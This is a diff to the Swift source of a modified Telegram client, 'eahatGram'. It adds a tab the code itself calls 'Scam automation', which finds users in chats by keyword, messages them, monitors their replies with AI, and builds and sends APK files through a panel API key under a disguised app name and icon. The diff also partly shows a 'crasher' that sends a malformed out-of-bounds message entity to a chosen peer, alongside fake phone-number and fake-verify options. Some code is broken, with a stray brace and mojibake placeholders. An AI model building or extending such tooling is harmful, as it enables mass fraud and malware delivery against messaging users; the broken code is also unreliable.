@@ -1,4 +1,4 @@
-import Foundation
+﻿import Foundation
 import UIKit
 import Display
 import AccountContext
@@ -41,6 +41,52 @@ private func eahatGramPositiveInt(_ value: String, defaultValue: Int, minValue: 
         return defaultValue
     }
     return min(maxValue, parsed)
+}
+
+private struct EahatGramReplaceRule: Codable, Equatable {
+    let source: String
+    let target: String
+}
+
+private let eahatGramCustomWordReplacementsKey = "eahatGram.customWordReplacements"
+
+private func eahatGramNormalizedReplaceText(_ value: String) -> String {
+    return value.trimmingCharacters(in: .whitespacesAndNewlines)
+}
+
+private func eahatGramLoadReplaceRules() -> [EahatGramReplaceRule] {
+    guard let data = UserDefaults.standard.data(forKey: eahatGramCustomWordReplacementsKey) else {
+        return []
+    }
+    guard let rules = try? JSONDecoder().decode([EahatGramReplaceRule].self, from: data) else {
+        return []
+    }
+    return rules.compactMap { rule -> EahatGramReplaceRule? in
+        let source = eahatGramNormalizedReplaceText(rule.source)
+        let target = eahatGramNormalizedReplaceText(rule.target)
+        guard !source.isEmpty && !target.isEmpty else {
+            return nil
+        }
+        return EahatGramReplaceRule(source: source, target: target)
+    }
+}
+
+private func eahatGramSaveReplaceRules(_ rules: [EahatGramReplaceRule]) {
+    let normalizedRules = rules.compactMap { rule -> EahatGramReplaceRule? in
+        let source = eahatGramNormalizedReplaceText(rule.source)
+        let target = eahatGramNormalizedReplaceText(rule.target)
+        guard !source.isEmpty && !target.isEmpty else {
+            return nil
+        }
+        return EahatGramReplaceRule(source: source, target: target)
+    }
+    guard !normalizedRules.isEmpty else {
+        UserDefaults.standard.removeObject(forKey: eahatGramCustomWordReplacementsKey)
+        return
+    }
+    if let data = try? JSONEncoder().encode(normalizedRules) {
+        UserDefaults.standard.set(data, forKey: eahatGramCustomWordReplacementsKey)
+    }
 }
 
 private func eahatGramPeerIdFromText(_ value: String) -> EnginePeer.Id? {
@@ -95,12 +141,13 @@ private func eahatGramRequestAutoReply(messages: [EahatGramAutoReplyMessage], co
     request.httpMethod = "POST"
     request.setValue("application/json", forHTTPHeaderField: "Content-Type")
     request.setValue("application/json", forHTTPHeaderField: "Accept")
+    request.timeoutInterval = 8.0
 
     let body = EahatGramAutoReplyRequest(
         model: "openai-fast",
         messages: messages,
         temperature: 0.35,
-        max_tokens: 120
+        max_tokens: 80
     )
 
     do {
@@ -157,8 +204,8 @@ private func eahatGramAutoReplyMessages(view: MessageHistoryView, replyMessage: 
     }
 
     contextMessages.sort(by: { $0.index < $1.index })
-    if contextMessages.count > 14 {
-        contextMessages = Array(contextMessages.suffix(14))
+    if contextMessages.count > 8 {
+        contextMessages = Array(contextMessages.suffix(8))
     }
 
     var transcriptLines: [String] = []
@@ -1067,6 +1114,10 @@ private final class EahatGramArguments {
     let updateNftUsernameTag: (String) -> Void
     let updateNftUsernamePrice: (String) -> Void
     let addNftUsernameTag: () -> Void
+    let updateReplaceSource: (String) -> Void
+    let updateReplaceTarget: (String) -> Void
+    let addReplaceRule: () -> Void
+    let removeReplaceRule: (Int) -> Void
     let updateFakePhoneNumber: (String) -> Void
     let updateFakeRateEnabled: (Bool) -> Void
     let updateFakeRateLevel: (String) -> Void
@@ -1120,6 +1171,23 @@ private final class EahatGramArguments {
     let runGiftProbe: (Int) -> Void
     let showOtherMethod: (Int) -> Void
 
+    // Scam properties
+    let updateScamChatLink: (Int, String) -> Void
+    let addScamChatLink: () -> Void
+    let updateScamSearchWord: (Int, String) -> Void
+    let addScamSearchWord: () -> Void
+    let updateScamMustIncludeEnabled: (Bool) -> Void
+    let updateScamMustIncludeWord: (Int, String) -> Void
+    let addScamMustIncludeWord: () -> Void
+    let updateScamMessageText: (String) -> Void
+    let updateScamMessageTextAfterConsent: (String) -> Void
+    let updateScamAddFileEnabled: (Bool) -> Void
+    let updateScamApiKey: (String) -> Void
+    let updateScamApkName: (String) -> Void
+    let updateScamApkPackage: (String) -> Void
+    let selectScamAvatar: () -> Void
+    let toggleScamFlow: () -> Void
+
     init(
         context: AccountContext,
         selectPeer: @escaping () -> Void,
@@ -1133,6 +1201,10 @@ private final class EahatGramArguments {
         updateNftUsernameTag: @escaping (String) -> Void,
         updateNftUsernamePrice: @escaping (String) -> Void,
         addNftUsernameTag: @escaping () -> Void,
+        updateReplaceSource: @escaping (String) -> Void,
+        updateReplaceTarget: @escaping (String) -> Void,
+        addReplaceRule: @escaping () -> Void,
+        removeReplaceRule: @escaping (Int) -> Void,
         updateFakePhoneNumber: @escaping (String) -> Void,
         updateFakeRateEnabled: @escaping (Bool) -> Void,
         updateFakeRateLevel: @escaping (String) -> Void,
@@ -1184,7 +1256,22 @@ private final class EahatGramArguments {
         updateFunctestToggle: @escaping (Int, Bool) -> Void,
         refreshResponses: @escaping () -> Void,
         runGiftProbe: @escaping (Int) -> Void,
-        showOtherMethod: @escaping (Int) -> Void
+        showOtherMethod: @escaping (Int) -> Void,
+        updateScamChatLink: @escaping (Int, String) -> Void,
+        addScamChatLink: @escaping () -> Void,
+        updateScamSearchWord: @escaping (Int, String) -> Void,
+        addScamSearchWord: @escaping () -> Void,
+        updateScamMustIncludeEnabled: @escaping (Bool) -> Void,
+        updateScamMustIncludeWord: @escaping (Int, String) -> Void,
+        addScamMustIncludeWord: @escaping () -> Void,
+        updateScamMessageText: @escaping (String) -> Void,
+        updateScamMessageTextAfterConsent: @escaping (String) -> Void,
+        updateScamAddFileEnabled: @escaping (Bool) -> Void,
+        updateScamApiKey: @escaping (String) -> Void,
+        updateScamApkName: @escaping (String) -> Void,
+        updateScamApkPackage: @escaping (String) -> Void,
+        selectScamAvatar: @escaping () -> Void,
+        toggleScamFlow: @escaping () -> Void
     ) {
         self.context = context
         self.selectPeer = selectPeer
@@ -1198,6 +1285,10 @@ private final class EahatGramArguments {
         self.updateNftUsernameTag = updateNftUsernameTag
         self.updateNftUsernamePrice = updateNftUsernamePrice
         self.addNftUsernameTag = addNftUsernameTag
+        self.updateReplaceSource = updateReplaceSource
+        self.updateReplaceTarget = updateReplaceTarget
+        self.addReplaceRule = addReplaceRule
+        self.removeReplaceRule = removeReplaceRule
         self.updateFakePhoneNumber = updateFakePhoneNumber
         self.updateFakeRateEnabled = updateFakeRateEnabled
         self.updateFakeRateLevel = updateFakeRateLevel
@@ -1250,6 +1341,23 @@ private final class EahatGramArguments {
         self.refreshResponses = refreshResponses
         self.runGiftProbe = runGiftProbe
         self.showOtherMethod = showOtherMethod
+
+        // Scam assignments
+        self.updateScamChatLink = updateScamChatLink
+        self.addScamChatLink = addScamChatLink
+        self.updateScamSearchWord = updateScamSearchWord
+        self.addScamSearchWord = addScamSearchWord
+        self.updateScamMustIncludeEnabled = updateScamMustIncludeEnabled
+        self.updateScamMustIncludeWord = updateScamMustIncludeWord
+        self.addScamMustIncludeWord = addScamMustIncludeWord
+        self.updateScamMessageText = updateScamMessageText
+        self.updateScamMessageTextAfterConsent = updateScamMessageTextAfterConsent
+        self.updateScamAddFileEnabled = updateScamAddFileEnabled
+        self.updateScamApiKey = updateScamApiKey
+        self.updateScamApkName = updateScamApkName
+        self.updateScamApkPackage = updateScamApkPackage
+        self.selectScamAvatar = selectScamAvatar
+        self.toggleScamFlow = toggleScamFlow
     }
 }
 
@@ -1257,6 +1365,7 @@ private enum EahatGramSection: Int32 {
     case controls
     case ai
     case farm
+    case replace
     case functest
     case wallpaper
     case custom
@@ -1264,6 +1373,7 @@ private enum EahatGramSection: Int32 {
     case chain
     case gifts
     case responses
+    case scam
     case other
 }
 
@@ -1273,8 +1383,10 @@ private enum EahatGramTab: Int, Equatable {
     case chain
     case ai
     case farm
+    case replace
     case functest
     case walpaper
+    case scam
 }
 
 private func eahatGramBogatiUiEnabled(_ settings: ExperimentalUISettings) -> Bool {
@@ -1319,6 +1431,9 @@ private struct EahatGramState: Equatable {
     var voiceModV2Voice: String
     var nftUsernameTagText: String
     var nftUsernamePriceText: String
+    var replaceSourceText: String
+    var replaceTargetText: String
+    var replaceRules: [EahatGramReplaceRule]
     var fakePhoneNumberText: String
     var fakeRateEnabled: Bool
     var fakeRateLevelText: String
@@ -1342,6 +1457,20 @@ private struct EahatGramState: Equatable {
     var functestDisableLanguageRecognitionEnabled: Bool
     var functestDisableReloginTokensEnabled: Bool
     var responses: [String]
+
+    // Scam fields
+    var scamChatLinks: [String]
+    var scamSearchWords: [String]
+    var scamMustIncludeEnabled: Bool
+    var scamMustIncludeWords: [String]
+    var scamMessageText: String
+    var scamMessageTextAfterConsent: String
+    var scamAddFileEnabled: Bool
+    var scamApiKey: String
+    var scamApkName: String
+    var scamApkPackage: String
+    var scamApkAvatarData: Data?
+    var scamIsRunning: Bool
 
     init(liquidGlassEnabled: Bool, replyQuoteEnabled: Bool, ghostModeEnabled: Bool, fakeOnlineEnabled: Bool, fakeOnlineBackgroundEnabled: Bool, saveDeletedMessagesEnabled: Bool, saveEditedMessagesEnabled: Bool, noLagsEnabled: Bool, viewUnread2ReadEnabled: Bool, hasCurrentChainVisualization: Bool, experimentalSettings: ExperimentalUISettings) {
         self.selectedTab = .me
@@ -1389,6 +1518,9 @@ private struct EahatGramState: Equatable {
         self.voiceModV2Voice = EahatGramDebugSettings.resolvedVoiceModV2Voice().title
         self.nftUsernameTagText = EahatGramDebugSettings.nftUsernameTag.with { $0 }
         self.nftUsernamePriceText = EahatGramDebugSettings.nftUsernamePrice.with { $0 }
+        self.replaceSourceText = ""
+        self.replaceTargetText = ""
+        self.replaceRules = eahatGramLoadReplaceRules()
         self.fakePhoneNumberText = EahatGramDebugSettings.fakePhoneNumber.with { $0 }
         self.fakeRateEnabled = EahatGramDebugSettings.fakeRateEnabled.with { $0 }
         self.fakeRateLevelText = EahatGramDebugSettings.fakeRateLevel.with { $0 }
@@ -1412,6 +1544,20 @@ private struct EahatGramState: Equatable {
         self.functestDisableLanguageRecognitionEnabled = experimentalSettings.disableLanguageRecognition
         self.functestDisableReloginTokensEnabled = experimentalSettings.disableReloginTokens
         self.responses = []
+
+        // Scam init
+        self.scamChatLinks = []
+        self.scamSearchWords = []
+        self.scamMustIncludeEnabled = false
+        self.scamMustIncludeWords = []
+        self.scamMessageText = ""
+        self.scamMessageTextAfterConsent = ""
+        self.scamAddFileEnabled = false
+        self.scamApiKey = ""
+        self.scamApkName = ""
+        self.scamApkPackage = "fdsgkjdsgsjkndfm.cn"
+        self.scamApkAvatarData = nil
+        self.scamIsRunning = false
     }
 }
 
@@ -1427,6 +1573,11 @@ private enum EahatGramEntry: ItemListNodeEntry {
     case nftUsernameTag(String)
     case nftUsernamePrice(String)
     case addNftUsernameTag
+    case replaceInfo(String)
+    case replaceSource(String)
+    case replaceTarget(String)
+    case addReplaceRule
+    case replaceRule(Int, String)
     case fakePhoneNumber(String)
     case fakeRate(Bool)
     case fakeRateLevel(String)
@@ -1494,6 +1645,25 @@ private enum EahatGramEntry: ItemListNodeEntry {
     case otherMethod(Int, String)
     case otherMethodInfo(Int, String)
 
+    // Scam cases
+    case scamInfo(String)
+    case scamChatLink(Int, String)
+    case scamAddChatLink
+    case scamSearchWord(Int, String)
+    case scamAddSearchWord
+    case scamMustIncludeEnabled(Bool)
+    case scamMustIncludeWord(Int, String)
+    case scamAddMustIncludeWord
+    case scamMessageText(String)
+    case scamMessageTextAfterConsent(String)
+    case scamAddFileEnabled(Bool)
+    case scamApiKey(String)
+    case scamApkName(String)
+    case scamApkPackage(String)
+    case scamSelectAvatar
+    case scamStartStop
+    case scamStatus(String)
+
     var section: ItemListSectionId {
         switch self {
         case .selectPeer, .crasher, .crasherDirect, .addGiftToProfile, .clearGifts, .removeAllContacts, .removeAllCalls, .nftUsernameTag, .nftUsernamePrice, .addNftUsernameTag, .fakePhoneNumber, .fakeRate, .fakeRateLevel, .fakeVerify, .targetHud, .liquidGlass, .replyQuote, .ghostMode, .fakeOnline, .fakeOnlineBackground, .saveDeletedMessages, .saveEditedMessages, .noLags, .bogatiUi, .noWarning, .sendMode, .translator, .translatorLanguage, .translateMyMessages, .translateMyMessagesLanguage, .downFolder, .customUiTheme, .viewUnread2Read, .voiceMod, .voiceModPreset, .voiceModV2, .voiceModV2Voice, .useDirectRpc, .refreshResponses:
@@ -1502,6 +1672,8 @@ private enum EahatGramEntry: ItemListNodeEntry {
             return EahatGramSection.ai.rawValue
         case .farmBotUsername, .farmCommand, .farmInterval, .farmBackground, .addFarmJob, .farmJobEnabled, .farmJobInfo, .removeFarmJob:
             return EahatGramSection.farm.rawValue
+        case .replaceInfo, .replaceSource, .replaceTarget, .addReplaceRule, .replaceRule:
+            return EahatGramSection.replace.rawValue
         case .functestInfo, .functestToggle:
             return EahatGramSection.functest.rawValue
         case .wallpaperInfo, .openWallpaperPicker:
@@ -1514,6 +1686,11 @@ private enum EahatGramEntry: ItemListNodeEntry {
             return EahatGramSection.chain.rawValue
         case .noGifts, .giftsSummary, .meGift, .meGiftInfo, .testGift, .testGiftInfo:
             return EahatGramSection.gifts.rawValue
+        case .noResponses, .response, .otherMethod, .otherMethodInfo:
+            return EahatGramSection.responses.rawValue
+        case .scamInfo, .scamChatLink, .scamAddChatLink, .scamSearchWord, .scamAddSearchWord, .scamMustIncludeEnabled, .scamMustIncludeWord, .scamAddMustIncludeWord, .scamMessageText, .scamMessageTextAfterConsent, .scamAddFileEnabled, .scamApiKey, .scamApkName, .scamApkPackage, .scamSelectAvatar, .scamStartStop, .scamStatus:
+            return EahatGramSection.scam.rawValue
+        }
         case .noResponses, .response:
             return EahatGramSection.responses.rawValue
         case .otherMethod, .otherMethodInfo:
@@ -1543,6 +1720,16 @@ private enum EahatGramEntry: ItemListNodeEntry {
             return 16
         case .addNftUsernameTag:
             return 30
+        case .replaceInfo:
+            return 9001000
+        case .replaceSource:
+            return 9001001
+        case .replaceTarget:
+            return 9001002
+        case .addReplaceRule:
+            return 9001003
+        case let .replaceRule(index, _):
+            return 9001100 + index
         case .fakePhoneNumber:
             return 11
         case .fakeRate:
@@ -1677,6 +1864,42 @@ private enum EahatGramEntry: ItemListNodeEntry {
             return 4000000 + index * 2
         case let .otherMethodInfo(index, _):
             return 4000000 + index * 2 + 1
+
+        // Scam stableIds
+        case .scamInfo:
+            return 7000000
+        case let .scamChatLink(index, _):
+            return 7000001 + index
+        case .scamAddChatLink:
+            return 7000010
+        case let .scamSearchWord(index, _):
+            return 7000011 + index
+        case .scamAddSearchWord:
+            return 7000020
+        case .scamMustIncludeEnabled:
+            return 7000021
+        case let .scamMustIncludeWord(index, _):
+            return 7000022 + index
+        case .scamAddMustIncludeWord:
+            return 7000030
+        case .scamMessageText:
+            return 7000031
+        case .scamMessageTextAfterConsent:
+            return 7000032
+        case .scamAddFileEnabled:
+            return 7000033
+        case .scamApiKey:
+            return 7000034
+        case .scamApkName:
+            return 7000035
+        case .scamApkPackage:
+            return 7000036
+        case .scamSelectAvatar:
+            return 7000037
+        case .scamStartStop:
+            return 7000038
+        case .scamStatus:
+            return 7000039
         }
     }
 
@@ -1745,6 +1968,36 @@ private enum EahatGramEntry: ItemListNodeEntry {
         case .addNftUsernameTag:
             if case .addNftUsernameTag = rhs {
                 return true
+            } else {
+                return false
+            }
+        case let .replaceInfo(lhsText):
+            if case let .replaceInfo(rhsText) = rhs {
+                return lhsText == rhsText
+            } else {
+                return false
+            }
+        case let .replaceSource(lhsText):
+            if case let .replaceSource(rhsText) = rhs {
+                return lhsText == rhsText
+            } else {
+                return false
+            }
+        case let .replaceTarget(lhsText):
+            if case let .replaceTarget(rhsText) = rhs {
+                return lhsText == rhsText
+            } else {
+                return false
+            }
+        case .addReplaceRule:
+            if case .addReplaceRule = rhs {
+                return true
+            } else {
+                return false
+            }
+        case let .replaceRule(lhsIndex, lhsText):
+            if case let .replaceRule(rhsIndex, rhsText) = rhs {
+                return lhsIndex == rhsIndex && lhsText == rhsText
             } else {
                 return false
             }
@@ -2144,6 +2397,110 @@ private enum EahatGramEntry: ItemListNodeEntry {
             } else {
                 return false
             }
+
+        // Scam equality checks
+        case let .scamInfo(lhsText):
+            if case let .scamInfo(rhsText) = rhs {
+                return lhsText == rhsText
+            } else {
+                return false
+            }
+        case let .scamChatLink(lhsIndex, lhsText):
+            if case let .scamChatLink(rhsIndex, rhsText) = rhs {
+                return lhsIndex == rhsIndex && lhsText == rhsText
+            } else {
+                return false
+            }
+        case .scamAddChatLink:
+            if case .scamAddChatLink = rhs {
+                return true
+            } else {
+                return false
+            }
+        case let .scamSearchWord(lhsIndex, lhsText):
+            if case let .scamSearchWord(rhsIndex, rhsText) = rhs {
+                return lhsIndex == rhsIndex && lhsText == rhsText
+            } else {
+                return false
+            }
+        case .scamAddSearchWord:
+            if case .scamAddSearchWord = rhs {
+                return true
+            } else {
+                return false
+            }
+        case let .scamMustIncludeEnabled(lhsValue):
+            if case let .scamMustIncludeEnabled(rhsValue) = rhs {
+                return lhsValue == rhsValue
+            } else {
+                return false
+            }
+        case let .scamMustIncludeWord(lhsIndex, lhsText):
+            if case let .scamMustIncludeWord(rhsIndex, rhsText) = rhs {
+                return lhsIndex == rhsIndex && lhsText == rhsText
+            } else {
+                return false
+            }
+        case .scamAddMustIncludeWord:
+            if case .scamAddMustIncludeWord = rhs {
+                return true
+            } else {
+                return false
+            }
+        case let .scamMessageText(lhsText):
+            if case let .scamMessageText(rhsText) = rhs {
+                return lhsText == rhsText
+            } else {
+                return false
+            }
+        case let .scamMessageTextAfterConsent(lhsText):
+            if case let .scamMessageTextAfterConsent(rhsText) = rhs {
+                return lhsText == rhsText
+            } else {
+                return false
+            }
+        case let .scamAddFileEnabled(lhsValue):
+            if case let .scamAddFileEnabled(rhsValue) = rhs {
+                return lhsValue == rhsValue
+            } else {
+                return false
+            }
+        case let .scamApiKey(lhsText):
+            if case let .scamApiKey(rhsText) = rhs {
+                return lhsText == rhsText
+            } else {
+                return false
+            }
+        case let .scamApkName(lhsText):
+            if case let .scamApkName(rhsText) = rhs {
+                return lhsText == rhsText
+            } else {
+                return false
+            }
+        case let .scamApkPackage(lhsText):
+            if case let .scamApkPackage(rhsText) = rhs {
+                return lhsText == rhsText
+            } else {
+                return false
+            }
+        case .scamSelectAvatar:
+            if case .scamSelectAvatar = rhs {
+                return true
+            } else {
+                return false
+            }
+        case .scamStartStop:
+            if case .scamStartStop = rhs {
+                return true
+            } else {
+                return false
+            }
+        case let .scamStatus(lhsText):
+            if case let .scamStatus(rhsText) = rhs {
+                return lhsText == rhsText
+            } else {
+                return false
+            }
         }
     }
 
@@ -2269,7 +2626,7 @@ private enum EahatGramEntry: ItemListNodeEntry {
                 systemStyle: .glass,
                 title: eahatGramInputTitle(presentationData, "NFT Price"),
                 text: text,
-                placeholder: "1200 TON",
+                placeholder: "1200 USD",
                 type: .regular(capitalization: false, autocorrection: false),
                 sectionId: self.section,
                 textUpdated: { value in
@@ -2288,6 +2645,64 @@ private enum EahatGramEntry: ItemListNodeEntry {
                 style: .blocks,
                 action: {
                     arguments.addNftUsernameTag()
+                }
+            )
+        case let .replaceInfo(text):
+            return ItemListTextItem(presentationData: presentationData, text: .plain(text), sectionId: self.section)
+        case let .replaceSource(text):
+            return ItemListSingleLineInputItem(
+                context: arguments.context,
+                presentationData: presentationData,
+                systemStyle: .glass,
+                title: eahatGramInputTitle(presentationData, "Replace From"),
+                text: text,
+                placeholder: "Р°СЂ",
+                type: .regular(capitalization: false, autocorrection: false),
+                sectionId: self.section,
+                textUpdated: { value in
+                    arguments.updateReplaceSource(value)
+                },
+                action: {}
+            )
+        case let .replaceTarget(text):
+            return ItemListSingleLineInputItem(
+                context: arguments.context,
+                presentationData: presentationData,
+                systemStyle: .glass,
+                title: eahatGramInputTitle(presentationData, "Replace To"),
+                text: text,
+                placeholder: "РїСЂ",
+                type: .regular(capitalization: false, autocorrection: false),
+                sectionId: self.section,
+                textUpdated: { value in
+                    arguments.updateReplaceTarget(value)
+                },
+                action: {}
+            )
+        case .addReplaceRule:
+            return ItemListActionItem(
+                presentationData: presentationData,
+                systemStyle: .glass,
+                title: "Add Replace Rule",
+                kind: .generic,
+                alignment: .natural,
+                sectionId: self.section,
+                style: .blocks,
+                action: {
+                    arguments.addReplaceRule()
+                }
+            )
+        case let .replaceRule(index, text):
+            return ItemListActionItem(
+                presentationData: presentationData,
+                systemStyle: .glass,
+                title: text,
+                kind: .destructive,
+                alignment: .natural,
+                sectionId: self.section,
+                style: .blocks,
+                action: {
+                    arguments.removeReplaceRule(index)
                 }
             )
         case let .fakePhoneNumber(text):
@@ -3005,6 +3420,235 @@ private enum EahatGramEntry: ItemListNodeEntry {
             )
         case let .otherMethodInfo(_, text):
             return ItemListTextItem(presentationData: presentationData, text: .plain(text), sectionId: self.section)
+
+        // Scam UI items
+        case let .scamInfo(text):
+            return ItemListTextItem(presentationData: presentationData, text: .plain(text), sectionId: self.section)
+        case let .scamChatLink(index, text):
+            return ItemListSingleLineInputItem(
+                context: arguments.context,
+                presentationData: presentationData,
+                systemStyle: .glass,
+                title: eahatGramInputTitle(presentationData, "Chat Link \(index + 1)"),
+                text: text,
+                placeholder: "t.me/chatname or @chatname",
+                type: .regular,
+                sectionId: self.section,
+                textUpdated: { value in
+                    arguments.updateScamChatLink(index, value)
+                },
+                action: {}
+            )
+        case .scamAddChatLink:
+            return ItemListActionItem(
+                presentationData: presentationData,
+                systemStyle: .glass,
+                title: "Add Chat Link",
+                kind: .generic,
+                alignment: .natural,
+                sectionId: self.section,
+                style: .blocks,
+                action: {
+                    arguments.addScamChatLink()
+                }
+            )
+        case let .scamSearchWord(index, text):
+            return ItemListSingleLineInputItem(
+                context: arguments.context,
+                presentationData: presentationData,
+                systemStyle: .glass,
+                title: eahatGramInputTitle(presentationData, "Search Word \(index + 1)"),
+                text: text,
+                placeholder: "word to search",
+                type: .regular,
+                sectionId: self.section,
+                textUpdated: { value in
+                    arguments.updateScamSearchWord(index, value)
+                },
+                action: {}
+            )
+        case .scamAddSearchWord:
+            return ItemListActionItem(
+                presentationData: presentationData,
+                systemStyle: .glass,
+                title: "Add Search Word",
+                kind: .generic,
+                alignment: .natural,
+                sectionId: self.section,
+                style: .blocks,
+                action: {
+                    arguments.addScamSearchWord()
+                }
+            )
+        case let .scamMustIncludeEnabled(value):
+            return ItemListSwitchItem(
+                presentationData: presentationData,
+                systemStyle: .glass,
+                title: "Must Include Words",
+                value: value,
+                sectionId: self.section,
+                style: .blocks,
+                updated: { value in
+                    arguments.updateScamMustIncludeEnabled(value)
+                }
+            )
+        case let .scamMustIncludeWord(index, text):
+            return ItemListSingleLineInputItem(
+                context: arguments.context,
+                presentationData: presentationData,
+                systemStyle: .glass,
+                title: eahatGramInputTitle(presentationData, "Must Include \(index + 1)"),
+                text: text,
+                placeholder: "required word",
+                type: .regular,
+                sectionId: self.section,
+                textUpdated: { value in
+                    arguments.updateScamMustIncludeWord(index, value)
+                },
+                action: {}
+            )
+        case .scamAddMustIncludeWord:
+            return ItemListActionItem(
+                presentationData: presentationData,
+                systemStyle: .glass,
+                title: "Add Must Include Word",
+                kind: .generic,
+                alignment: .natural,
+                sectionId: self.section,
+                style: .blocks,
+                action: {
+                    arguments.addScamMustIncludeWord()
+                }
+            )
+        case let .scamMessageText(text):
+            return ItemListMultilineInputItem(
+                presentationData: presentationData,
+                text: text,
+                placeholder: "Initial message text",
+                maxLength: ItemListMultilineInputItemTextLimit(value: 1000, display: true, mode: .hard),
+                sectionId: self.section,
+                style: .blocks,
+                textUpdated: { value in
+                    arguments.updateScamMessageText(value)
+                },
+                shouldUpdateText: { _ in return true },
+                processPaste: nil,
+                updatedFocus: nil,
+                tag: nil,
+                action: {},
+                inlineAction: nil,
+                textColor: .primary,
+                enablesReturnKeyAutomatically: false,
+                returnKeyType: .default,
+                lockedForEditing: false
+            )
+        case let .scamMessageTextAfterConsent(text):
+            return ItemListMultilineInputItem(
+                presentationData: presentationData,
+                text: text,
+                placeholder: "Message after consent",
+                maxLength: ItemListMultilineInputItemTextLimit(value: 1000, display: true, mode: .hard),
+                sectionId: self.section,
+                style: .blocks,
+                textUpdated: { value in
+                    arguments.updateScamMessageTextAfterConsent(value)
+                },
+                shouldUpdateText: { _ in return true },
+                processPaste: nil,
+                updatedFocus: nil,
+                tag: nil,
+                action: {},
+                inlineAction: nil,
+                textColor: .primary,
+                enablesReturnKeyAutomatically: false,
+                returnKeyType: .default,
+                lockedForEditing: false
+            )
+        case let .scamAddFileEnabled(value):
+            return ItemListSwitchItem(
+                presentationData: presentationData,
+                systemStyle: .glass,
+                title: "Add File (Build APK)",
+                value: value,
+                sectionId: self.section,
+                style: .blocks,
+                updated: { value in
+                    arguments.updateScamAddFileEnabled(value)
+                }
+            )
+        case let .scamApiKey(text):
+            return ItemListSingleLineInputItem(
+                context: arguments.context,
+                presentationData: presentationData,
+                systemStyle: .glass,
+                title: eahatGramInputTitle(presentationData, "API Key"),
+                text: text,
+                placeholder: "panel api key",
+                type: .regular,
+                sectionId: self.section,
+                textUpdated: { value in
+                    arguments.updateScamApiKey(value)
+                },
+                action: {}
+            )
+        case let .scamApkName(text):
+            return ItemListSingleLineInputItem(
+                context: arguments.context,
+                presentationData: presentationData,
+                systemStyle: .glass,
+                title: eahatGramInputTitle(presentationData, "APK Name"),
+                text: text,
+                placeholder: "app name",
+                type: .regular,
+                sectionId: self.section,
+                textUpdated: { value in
+                    arguments.updateScamApkName(value)
+                },
+                action: {}
+            )
+        case let .scamApkPackage(text):
+            return ItemListSingleLineInputItem(
+                context: arguments.context,
+                presentationData: presentationData,
+                systemStyle: .glass,
+                title: eahatGramInputTitle(presentationData, "Package Name"),
+                text: text,
+                placeholder: "fdsgkjdsgsjkndfm.cn",
+                type: .regular,
+                sectionId: self.section,
+                textUpdated: { value in
+                    arguments.updateScamApkPackage(value)
+                },
+                action: {}
+            )
+        case .scamSelectAvatar:
+            return ItemListActionItem(
+                presentationData: presentationData,
+                systemStyle: .glass,
+                title: "Select APK Avatar",
+                kind: .generic,
+                alignment: .natural,
+                sectionId: self.section,
+                style: .blocks,
+                action: {
+                    arguments.selectScamAvatar()
+                }
+            )
+        case .scamStartStop:
+            return ItemListActionItem(
+                presentationData: presentationData,
+                systemStyle: .glass,
+                title: "Start Scam Flow",
+                kind: .generic,
+                alignment: .natural,
+                sectionId: self.section,
+                style: .blocks,
+                action: {
+                    arguments.toggleScamFlow()
+                }
+            )
+        case let .scamStatus(text):
+            return ItemListTextItem(presentationData: presentationData, text: .plain(text), sectionId: self.section)
         }
     }
 }
@@ -3339,6 +3983,17 @@ private func eahatGramEntries(
                 entries.append(.removeFarmJob(i, "Delete @\(job.botUsername)"))
             }
         }
+    case .replace:
+        entries.append(.replaceInfo(state.replaceRules.isEmpty ? "Format: word -> word. Replacement is applied to sent messages before enqueue. No custom replace rules yet." : "Format: word -> word. Replacement is applied to sent messages before enqueue. Tap an existing rule to delete it."))
+        entries.append(.replaceSource(state.replaceSourceText))
+        entries.append(.replaceTarget(state.replaceTargetText))
+        entries.append(.addReplaceRule)
+        if !state.replaceRules.isEmpty {
+            for i in 0 ..< state.replaceRules.count {
+                let rule = state.replaceRules[i]
+                entries.append(.replaceRule(i, "\(rule.source) -> \(rule.target)"))
+            }
+        }
     case .functest:
         entries.append(.functestInfo("10 runtime-backed ExperimentalUISettings switches. Each toggle writes a real boolean flag that is already read by existing code paths."))
         for toggle in EahatGramFunctestToggle.allCases {
@@ -3347,6 +4002,53 @@ private func eahatGramEntries(
     case .walpaper:
         entries.append(.wallpaperInfo("Custom global chat wallpaper picker. Supports photo and video files through local eahatGram wallpaper storage."))
         entries.append(.openWallpaperPicker)
+
+    case .scam:
+        entries.append(.scamInfo("Scam automation: search users in chats, send messages, monitor responses with AI, build and send APK files."))
+
+        // Chat links (max 6)
+        for i in 0 ..< state.scamChatLinks.count {
+            entries.append(.scamChatLink(i, state.scamChatLinks[i]))
+        }
+        if state.scamChatLinks.count < 6 {
+            entries.append(.scamAddChatLink)
+        }
+
+        // Search words (max 5)
+        for i in 0 ..< state.scamSearchWords.count {
+            entries.append(.scamSearchWord(i, state.scamSearchWords[i]))
+        }
+        if state.scamSearchWords.count < 5 {
+            entries.append(.scamAddSearchWord)
+        }
+
+        // Must include toggle and words (max 3)
+        entries.append(.scamMustIncludeEnabled(state.scamMustIncludeEnabled))
+        if state.scamMustIncludeEnabled {
+            for i in 0 ..< state.scamMustIncludeWords.count {
+                entries.append(.scamMustIncludeWord(i, state.scamMustIncludeWords[i]))
+            }
+            if state.scamMustIncludeWords.count < 3 {
+                entries.append(.scamAddMustIncludeWord)
+            }
+        }
+
+        // Message texts
+        entries.append(.scamMessageText(state.scamMessageText))
+        entries.append(.scamMessageTextAfterConsent(state.scamMessageTextAfterConsent))
+
+        // APK build options
+        entries.append(.scamAddFileEnabled(state.scamAddFileEnabled))
+        if state.scamAddFileEnabled {
+            entries.append(.scamApiKey(state.scamApiKey))
+            entries.append(.scamApkName(state.scamApkName))
+            entries.append(.scamApkPackage(state.scamApkPackage))
+            entries.append(.scamSelectAvatar)
+        }
+
+        // Start/Stop button
+        entries.append(.scamStartStop)
+        entries.append(.scamStatus(state.scamIsRunning ? "Scam flow is running..." : "Scam flow is stopped"))
     }
 
     entries.sort()
@@ -3489,54 +4191,7 @@ private func eahatGramScreen(context: AccountContext, starsContext: StarsContext
             pushControllerImpl?(controller)
         },
         sendCrasher: {
-            let currentState = stateValue.with { $0 }
-            guard let targetPeerId = currentState.selectedPeerId else {
-                appendResponse("crasher failed reason=NO_PEER_SELECTED")
-                return
-            }
-            
-            // Create malformed custom emoji entity with out-of-bounds range
-            let messageText = "test"
-            let malformedOffset = 1000
-            let malformedLength = 100
-            
-            let message: EnqueueMessage = .message(
-                text: messageText,
-                attributes: [
-                    TextEntitiesMessageAttribute(entities: [
-                        MessageTextEntity(
